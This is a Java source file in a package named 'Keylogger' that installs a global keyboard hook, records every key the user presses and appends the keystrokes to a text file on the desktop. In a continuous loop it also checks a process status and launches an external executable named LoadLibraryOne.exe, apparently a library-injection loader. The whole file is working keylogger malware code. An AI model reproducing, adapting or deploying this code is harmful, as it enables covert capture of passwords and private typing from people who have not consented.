package Keylogger;

import java.io.File;
import java.io.IOException;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Principal implements NativeKeyListener {
    public static void main(String[] args) {
        //System.out.println("Hello world");
   
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {////
            e.printStackTrace();
        }
        Arquivo.criar("C:\\Users\\henri\\Desktop\\arquivo\\teste.txt");
        GlobalScreen.addNativeKeyListener(new Principal());
        while(true) {
        	try {
            	int isOpen = Processos.verificar();
            	if(isOpen == 1) {
            		Runtime.getRuntime().exec("C:\\Users\\henri\\Desktop\\LoadLibrary\\LoadLibraryOne.exe",
							null, new File("C:\\Users\\henri\\Desktop\\LoadLibrary\\"));
            	}
            }catch(IOException e) {
        		e.printStackTrace();
        	}
        	
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
    	String tecla = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
        System.out.println("Pressionou: " + tecla);
        if(tecla == "Space") {
        	tecla = " ";
        }
        if(tecla == "Enter") {
        	tecla = "\n";
        }
        Arquivo.escrever("C:\\Users\\henri\\Desktop\\arquivo\\teste.txt", tecla);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeEvent) {

    	String tecla = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
        System.out.println("Soltou: " + tecla);
    }

    @Override
    public  void nativeKeyTyped(NativeKeyEvent nativeEvent) {

    }
}
